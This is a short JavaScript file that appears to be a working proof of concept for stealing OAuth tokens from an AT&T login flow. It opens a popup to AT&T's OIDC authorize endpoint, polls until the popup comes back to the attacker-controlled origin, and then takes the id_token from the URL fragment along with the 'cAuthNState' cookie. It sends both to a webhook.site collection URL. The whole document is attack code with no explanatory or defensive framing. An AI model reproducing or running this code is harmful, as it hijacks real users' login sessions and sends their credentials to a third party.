 
const window2 = window.open('https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&client_id=m36305&redirect_uri=https://finalstage.att.com/myatt/lgn/resources/unauth/login/haloc/oidc/redirect&state=from=idp&scope=openid&response_mode=get&nonce=1111');
function getCookie(name) {const value = `; ${document.cookie}`;const parts = value.split(`; ${name}=`);if (parts.length === 2) return parts.pop().split(';').shift();}
function checkForRedirectBack() {
    try {
        if (window2 && !window2.closed) {
            const currentHref = window2.location.href;

            if (window2.location.origin === window.location.origin) {
                const urlParams = new URLSearchParams(window2.location.hash.substring(1));
                window.location.href = `https://webhook.site/14f1168b-6287-4cc1-9a5e-bb80a0e5afd6/?${urlParams+ '&cAuthNState='+getCookie('cAuthNState')}`
                clearInterval(pollTimer);
                window2.close();
            }
        } else {
            clearInterval(pollTimer);
        }
    } catch (err) {

    }
}

const pollTimer = setInterval(checkForRedirectBack, 1000);
